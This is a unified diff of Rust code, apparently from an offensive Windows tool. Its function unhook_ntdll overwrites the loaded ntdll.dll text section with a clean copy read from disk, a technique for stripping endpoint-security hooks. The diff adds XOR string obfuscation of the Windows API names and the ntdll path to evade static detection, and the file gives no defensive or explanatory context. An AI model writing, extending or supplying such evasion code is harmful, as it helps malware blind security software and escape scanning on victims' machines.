@@ -87,7 +87,10 @@ fn text_section(base: usize) -> Option<(usize, usize, usize)> {
 /// Path of the system's ntdll (mirrors where the loader read it from).
 fn ntdll_path() -> Option<String> {
     let root = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".into());
-    Some(format!(r"{root}\System32\ntdll.dll"))
+    Some(format!(
+        r"{root}\{suffix}",
+        suffix = crate::xs!("System32\\ntdll.dll", 0x57)
+    ))
 }
 
 /// Read the on-disk `ntdll.dll` into a buffer.
@@ -95,10 +98,13 @@ fn read_disk_ntdll() -> Option<Vec<u8>> {
     let path = ntdll_path()?;
     let wide: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
 
-    let create_file_w = unsafe { std::mem::transmute::<usize, CreateFileW>(k32("CreateFileW")) };
-    let get_file_size_ex =
-        unsafe { std::mem::transmute::<usize, GetFileSizeEx>(k32("GetFileSizeEx")) };
-    let read_file = unsafe { std::mem::transmute::<usize, ReadFile>(k32("ReadFile")) };
+    let create_file_w =
+        unsafe { std::mem::transmute::<usize, CreateFileW>(k32(&crate::xs!("CreateFileW", 0x53))) };
+    let get_file_size_ex = unsafe {
+        std::mem::transmute::<usize, GetFileSizeEx>(k32(&crate::xs!("GetFileSizeEx", 0x54)))
+    };
+    let read_file =
+        unsafe { std::mem::transmute::<usize, ReadFile>(k32(&crate::xs!("ReadFile", 0x55))) };
 
     // SAFETY: CreateFileW with read-only flags on a NUL-terminated path; the
     // handle is closed on every path out of this fn (guard below).
@@ -165,8 +171,9 @@ pub fn unhook_ntdll() -> Result<usize, &'static str> {
 
     let target = base + rva;
     let mut old_prot = 0u32;
-    let virtual_protect =
-        unsafe { std::mem::transmute::<usize, VirtualProtect>(k32("VirtualProtect")) };
+    let virtual_protect = unsafe {
+        std::mem::transmute::<usize, VirtualProtect>(k32(&crate::xs!("VirtualProtect", 0x56)))
+    };
     // SAFETY: target is inside the loaded ntdll image (readable+executable);
     // we flip it writable, copy, then restore the original protection.
     unsafe {
@@ -198,7 +205,8 @@ impl Drop for OwnedHandle {
     fn drop(&mut self) {
         // SAFETY: CloseHandle on a handle we own (failure is benign).
         unsafe {
-            let close = std::mem::transmute::<usize, CloseHandle>(k32("CloseHandle"));
+            let close =
+                std::mem::transmute::<usize, CloseHandle>(k32(&crate::xs!("CloseHandle", 0x57)));
             let _ = close(self.0);
         }
     }
